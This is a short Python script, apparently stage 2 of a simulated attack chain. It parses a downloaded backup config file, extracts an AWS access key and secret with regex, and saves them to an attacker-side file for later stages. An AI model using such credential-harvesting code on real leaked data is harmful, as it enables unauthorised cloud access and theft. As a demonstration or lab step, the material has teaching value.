"""STAGE 2 — Credential leak discovery.
Parses the downloaded backup config file and extracts the leaked IAM key/secret."""
import json
import re

INPUT_FILE = "attacker/downloaded_config.yaml.bak"
OUTPUT_FILE = "attacker/.leaked_creds"


def main():
    print("=== STAGE 2: Extracting leaked credentials ===")
    with open(INPUT_FILE, "r") as f:
        content = f.read()

    key_match = re.search(r"access_key_id:\s*(\S+)", content)
    secret_match = re.search(r"secret_access_key:\s*(\S+)", content)

    if not key_match or not secret_match:
        print("Could not find credentials in the config file.")
        return

    access_key = key_match.group(1)
    secret_key = secret_match.group(1)

    print(f"[+] Found leaked AWS access key: {access_key}")
    print(f"[+] Found leaked AWS secret key: {secret_key[:6]}... (redacted in output)")

    with open(OUTPUT_FILE, "w") as f:
        json.dump({"access_key_id": access_key, "secret_access_key": secret_key}, f)

    print(f"[+] Saved credentials to {OUTPUT_FILE}")
    print("=== STAGE 2 COMPLETE ===\n")


if __name__ == "__main__":
    main()
